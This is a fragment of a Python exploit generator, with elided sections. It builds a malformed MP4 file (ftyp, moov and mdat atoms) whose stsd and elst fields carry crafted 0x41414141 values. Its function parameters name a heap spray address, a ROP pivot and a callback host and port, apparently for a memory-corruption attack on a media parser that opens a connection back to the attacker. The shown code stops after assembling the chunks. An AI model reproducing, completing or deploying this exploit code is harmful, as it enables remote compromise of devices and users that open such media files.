...
def make_chunk(tag, data):
    ...
    ret += tag.encode('latin-1') if isinstance(tag, str) else tag
    ret += data
    return ret
...
#
def create_mp4(spray_addr, rop_pivot, cbhost, cbport):
    #ftyp = make_chunk('ftyp', 'mp42' + '\x00' * 4)
    ftyp = make_chunk('ftyp', b'mp42' + b'\x00' * 4)
    #moov = make_chunk('moov', 'trak' + 'mdia' + 'minf' + 'stbl' + 'stsd' + struct.pack('>L', 0x41414141) + struct.pack('>L', 0) * 13 + 'elst' + struct.pack('>L', 0) * 11 + struct.pack('>L', 0x41414141))
    #moov = make_chunk('moov', 'trak' + 'mdia' + 'minf' + 'stbl' + 'stsd' + struct.pack('>L', 0x41414141) + struct.pack('>L', 0) * 13 + b'elst' + struct.pack('>L', 0) * 11 + struct.pack('>L', 0x41414141).decode('utf-8'))
    moov = make_chunk('moov', b'trak' + b'mdia' + b'minf' + b'stbl' + b'stsd' + struct.pack('>L', 0x41414141) + struct.pack('>L', 0) * 13 + b'elst' + struct.pack('>L', 0) * 11 + struct.pack('>L', 0x41414141))

    # moov = make_chunk('moov', 'trak' + 'mdia' + 'minf' + 'stbl' + 'stsd' + b'your_bytes_object'.decode('utf-8'))

    #mdat = make_chunk('mdat', 'ABCD')
    mdat = make_chunk('mdat', b'ABCD')
    chunks = [ftyp, moov, mdat]
